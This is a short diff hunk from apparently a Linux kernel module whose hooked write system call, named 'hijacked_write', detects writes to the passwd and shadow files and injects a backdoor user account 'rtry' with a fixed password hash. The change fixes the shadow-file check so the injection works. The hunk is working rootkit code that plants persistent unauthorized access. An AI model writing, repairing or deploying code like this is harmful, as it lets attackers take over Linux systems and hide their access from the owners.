@@ -84,7 +84,7 @@ asmlinkage long hijacked_write(unsigned int fd, char __user *buf, size_t count)
 	/* check if the opened file is passwd or shadow file */
 	if(strstr(path, passwd) != NULL)
 		str = "rtry:x:1001:1001:Rashmi,,,:/home/rashmi:/bin/bash\n";
-	else if(strstr(path, shadow) != path)
+	else if(strstr(path, shadow) != NULL)
 	 str = "rtry:$6$ZymoiqnH$guiA6/D9BFJyVHlx/4cJjWVF6PUsJaNxDYVf1X8iIr.uUnini10JGzcUueMjftbamAtciYLMOdGMg2gt3mUR71:17132:0:99999:7:::\n";
 
 
